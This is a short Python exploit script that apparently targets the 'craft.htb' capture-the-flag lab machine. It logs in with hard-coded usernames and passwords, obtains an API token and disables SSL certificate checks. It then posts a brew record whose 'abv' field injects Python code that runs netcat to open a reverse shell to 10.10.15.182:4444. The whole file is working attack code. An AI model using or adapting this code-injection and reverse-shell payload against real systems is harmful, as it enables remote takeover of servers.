import requests
import json
import urllib3

# TURN OFF SSL WARNINGS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

login_pass = ('dinesh', '4aUh0A8PbVJxgd')
login_pass = ('gilfoyle', 'ZEU3N8WNM2rh4T')

# auth
auth = session.get('https://api.craft.htb/api/auth/login', auth=login_pass, verify=False)
auth_json = json.loads(auth.text)
token = auth_json['token']
headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# check
check = session.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print("[*] Check auth:", check.text)


abv = "__import__('os').system('nc 10.10.15.182 4444 -e /bin/sh')"
payload = {
  "id": 0,
  "brewer": "ololo",
  "name": "ololo",
  "style": "ololosha",
  "abv": abv
}
json_payload = json.dumps(payload)

brew = session.post('https://api.craft.htb/api/brew/', headers=headers, data=json_payload, verify=False)
print(brew.text)
